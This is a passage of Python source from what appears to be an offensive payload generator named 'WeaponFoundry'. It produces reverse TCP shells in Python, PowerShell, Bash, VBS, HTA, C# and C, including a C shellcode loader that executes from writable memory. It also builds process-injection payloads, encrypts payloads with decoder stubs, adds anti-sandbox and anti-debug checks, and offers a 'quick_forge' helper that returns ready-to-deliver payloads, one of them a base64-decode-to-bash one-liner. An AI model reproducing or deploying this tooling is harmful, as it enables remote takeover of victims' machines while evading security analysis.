                f"ctypes.windll.kernel32.WaitForSingleObject(-1, -1)\n"
            )

        return self.templates.get_reverse_shell_python(lhost, lport)

    def _get_reverse_tcp_payload(
        self,
        format: PayloadFormat,
        lhost: str,
        lport: int,
    ) -> str:
        """Return reverse TCP payload for the requested format."""
        if format == PayloadFormat.RAW:
            sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
            return sc.hex() if sc else "# shellcode generation failed"
        if format == PayloadFormat.PYTHON:
            return self.templates.get_reverse_shell_python(lhost, lport)
        if format == PayloadFormat.POWERSHELL:
            return self.templates.get_reverse_shell_powershell(lhost, lport)
        if format == PayloadFormat.BASH:
            return self.templates.get_reverse_shell_bash(lhost, lport)
        if format == PayloadFormat.VBS:
            return self.templates.get_reverse_shell_vbs(lhost, lport)
        if format == PayloadFormat.HTA:
            return self.templates.get_reverse_shell_hta(lhost, lport)
        if format == PayloadFormat.CSHARP:
            return self.templates.get_reverse_shell_csharp(lhost, lport)
        if format == PayloadFormat.C:
            sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
            hex_bytes = ", ".join(f"0x{b:02x}" for b in sc) if sc else "/* failed */"
            return (
                "#include <windows.h>\n"
                "unsigned char sc[] = {" + hex_bytes + "};\n"
                "int main() {\n"
                "    void *p = VirtualAlloc(0, sizeof(sc), "
                "MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
                "    memcpy(p, sc, sizeof(sc));\n"
                "    ((void(*)())p)();\n"
                "}\n"
            )
        return self.templates.get_reverse_shell_python(lhost, lport)

    def _get_process_injection_payload(self, lhost: str, lport: int) -> str:
        """Build a process-injection payload with embedded shellcode."""
        raw_shellcode = self.shellcode_gen.get_windows_x64_reverse_tcp(
            lhost,
            lport,
        )
        injector_code = self.templates.get_process_injector_python(
            shellcode_var="_sc",
        )
        sc_repr = str(raw_shellcode)
        return f"_sc={sc_repr}\n{injector_code}"

    def _add_anti_analysis(
        self,
        payload: str,
        format: PayloadFormat,
        anti_sandbox: bool,
        anti_debug: bool,
        sleep_seconds: int,
    ) -> str:
        """Add anti-analysis checks to payload."""
        prefix = ""

        if format == PayloadFormat.PYTHON:
            if sleep_seconds > 0:
                prefix += self.anti_analysis.get_sleep_check_python(sleep_seconds)
            if anti_sandbox:
                prefix += self.anti_analysis.get_vm_check_python()
            if anti_debug:
                prefix += self.anti_analysis.get_debug_check_python()

        return prefix + payload

    def _generate_decoder(
        self,
        encryption: EncryptionMethod,
        key: bytes,
        format: PayloadFormat,
    ) -> str:
        """Generate decoder stub for encrypted payload."""
        if encryption == EncryptionMethod.NONE:
            return ""

        if format == PayloadFormat.PYTHON:
            if encryption in (EncryptionMethod.XOR, EncryptionMethod.XOR_MULTI):
                return self.decoder.get_xor_decoder_python(key)
            if encryption == EncryptionMethod.RC4:
                return self.decoder.get_rc4_decoder_python(key)
            if encryption == EncryptionMethod.AES:
                return self.decoder.get_aes_decoder_python(key)
            if encryption == EncryptionMethod.CHACHA20:
                return self.decoder.get_chacha20_decoder_python(key)

        elif format == PayloadFormat.POWERSHELL:
            if encryption == EncryptionMethod.XOR:
                return self.decoder.get_xor_decoder_powershell(key)

        return ""

    def get_final_payload(self, generated: GeneratedPayload) -> str:
        """Get final payload ready for delivery.

        Combines encrypted payload with decoder stub.

        Args:
            generated: GeneratedPayload from forge()

        Returns:
            Complete executable payload as string

        """
        encoded = base64.b64encode(generated.payload).decode()

        if generated.format == PayloadFormat.PYTHON:
            return f'_e="{encoded}"\n{generated.decoder_stub}'

        if generated.format == PayloadFormat.POWERSHELL:
            return f'$e="{encoded}"\n{generated.decoder_stub}'

        if generated.format == PayloadFormat.BASH:
            return f'echo "{encoded}" | base64 -d | bash'

        return encoded

    def list_capabilities(self) -> dict[str, list[str]]:
        """List all available capabilities."""
        return {
            "shell_types": [s.value for s in ShellType],
            "formats": [f.value for f in PayloadFormat],
            "encryptions": [e.value for e in EncryptionMethod],
            "anti_analysis": [
                "sandbox_evasion",
                "debug_detection",
                "sleep_check",
                "vm_detection",
            ],
        }


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================


def get_weapon_foundry() -> WeaponFoundry:
    """Get singleton WeaponFoundry instance.

    Returns:
        WeaponFoundry instance

    """
    global _weapon_foundry
    if _weapon_foundry is None:
        _weapon_foundry = WeaponFoundry()
    return _weapon_foundry


def quick_forge(
    lhost: str,
    lport: int = 4444,
    encryption: str = "xor",
    format: str = "python",
) -> str:
    """Quick payload generation.

    Args:
        lhost: Listener host
        lport: Listener port
        encryption: Encryption method name
        format: Output format name

    Returns:
        Ready-to-use payload string

    """
    foundry = get_weapon_foundry()

    enc_method = EncryptionMethod(encryption)
    fmt = PayloadFormat(format)

    payload = foundry.forge(lhost=lhost, lport=lport, encryption=enc_method, format=fmt)

    return foundry.get_final_payload(payload)
